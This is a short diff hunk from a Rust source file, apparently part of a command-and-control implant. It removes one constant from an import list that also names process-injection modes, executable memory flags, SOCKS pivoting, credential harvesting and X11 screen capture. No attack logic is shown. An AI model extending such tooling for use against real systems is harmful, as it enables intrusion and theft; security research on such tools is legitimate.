@@ -20,7 +20,7 @@ use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use super::types::SocksClientState;
 
 use super::{
-    ActiveDownload, CAT_SIZE_LIMIT, DownloadTransferState, GroupEntry, HarvestEntry,
+    ActiveDownload, DownloadTransferState, GroupEntry, HarvestEntry,
     INJECT_ERROR_FAILED, INJECT_WAY_EXECUTE, INJECT_WAY_INJECT, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
     MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_WRITECOPY,
     PendingCallback, PhantomState, PivotConnection, SessionEntry, UserEntry, capture_x11_native,
